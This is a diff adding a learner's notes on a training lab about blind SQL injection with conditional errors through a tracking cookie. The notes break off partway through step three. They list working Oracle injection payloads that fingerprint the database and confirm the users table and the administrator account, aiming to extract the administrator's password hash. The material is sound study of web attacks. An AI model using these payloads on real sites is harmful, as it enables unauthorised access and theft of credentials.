@@ -1,0 +1,21 @@
+Lab 12- Blind SQL Injections attack with conditional errors
+
+vulnerable parameter - tracking Cookie
+
+End Goals:
+- Output the administrator's password hash by exploiting a blind SQL injection vulnerability using conditional errors.
+- Login as the administrator using the extracted password hash.
+
+Analysis:
+1. Prove that the parameter is vulnerable to SQL injection.
+Try with  ' Result Error 500 Internal Server Error
+Try with  '||(select '')||' - Error because it is not Mysql
+Try with '||(select '' from dual)||' Successfull it is from Oracle
+COnfirm : '||(select '' from dualasdadasdas)||' -Should Give error
+
+2. Confirm that users table exists
+' || (select '' from users where rownum=1) ||'
+Successfull it is from Oracle and users table exists
+
+3. Confirm that administrator user exists
+' || (select '' from users where username='administrator' and rownum=1) ||
